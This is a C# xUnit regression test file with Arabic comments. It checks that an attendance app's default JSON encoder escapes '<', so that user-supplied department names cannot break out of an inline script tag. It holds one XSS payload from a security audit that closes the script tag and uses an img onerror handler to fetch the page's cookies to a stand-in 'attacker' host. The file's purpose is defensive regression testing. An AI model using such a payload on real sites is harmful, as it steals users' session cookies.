using System.Text.Json;
using Xunit;

namespace SmartAttendance.Tests;

/// <summary>
/// انحدار أمني: كتالوج المعايير يُحقن بصفحاتٍ داخل
/// <c>&lt;script type="application/json"&gt;</c> عبر <c>@Html.Raw</c>، ومحتواه
/// يأتي من القاعدة (أسماء أقسام وفروع ومناصب وحقول مخصّصة يكتبها المستخدمون).
///
/// كان مُسلسَلاً بـ<c>UnsafeRelaxedJsonEscaping</c> الذي **لا يهرّب</c> <c>&lt;</c>،
/// فقسمٌ اسمه <c>…&lt;/script&gt;&lt;img src=x onerror=…&gt;</c> ينفّذ سكربتاً
/// بجلسة كل من يفتح الصفحة. هذه الاختبارات تحرس المُرمِّز الافتراضي.
/// </summary>
public class JsonScriptInjectionTests
{
    private sealed record Option(string Value, string Label);

    /// <summary>الحمولة الحقيقية من تقرير الفحص الأمني.</summary>
    private const string Payload =
        "قسم المبيعات</script><img src=x onerror=\"fetch('https://attacker/'+document.cookie)\">";

    [Fact]
    public void Default_encoder_escapes_the_script_breakout()
    {
        var json = JsonSerializer.Serialize(new[] { new Option("1", Payload) });

        // الهروب من الوسم يحتاج «<» حرفياً — والمُرمِّز الافتراضي يحوّلها.
        Assert.DoesNotContain("</script>", json, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<", json, StringComparison.Ordinal);
        Assert.Contains("\\u003C", json, StringComparison.Ordinal);
    }

    /// <summary>الترميز لا يفسد القيمة: ما يُقرأ هو ما كُتب حرفياً.</summary>
    [Fact]
    public void Escaping_is_lossless()
    {
        var json = JsonSerializer.Serialize(new[] { new Option("1", Payload) });
        var back = JsonSerializer.Deserialize<Option[]>(json)!;

        Assert.Equal(Payload, back[0].Label);
    }

    /// <summary>العربية تبقى سليمة بعد الترميز — لا تُشوَّه ولا تُفقَد.</summary>
    [Fact]
    public void Arabic_survives_encoding()
    {
        const string arabic = "قسم الموارد البشرية · فرع البصرة";

        var json = JsonSerializer.Serialize(new[] { new Option("1", arabic) });
        var back = JsonSerializer.Deserialize<Option[]>(json)!;

        Assert.Equal(arabic, back[0].Label);
    }

    /// <summary>
    /// حارس صريح: المُرمِّز المتساهل **يترك** الحمولة قابلة للتنفيذ. وجوده هنا
    /// يوثّق سبب المنع، فلا يُعاد بحسن نيّة «ليقرأ الـJSON أجمل».
    /// </summary>
    [Fact]
    public void Relaxed_encoder_would_leave_the_payload_executable()
    {
        var unsafeJson = JsonSerializer.Serialize(
            new[] { new Option("1", Payload) },
            new JsonSerializerOptions
            {
                Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
            });

        Assert.Contains("</script>", unsafeJson, StringComparison.OrdinalIgnoreCase);
    }
}
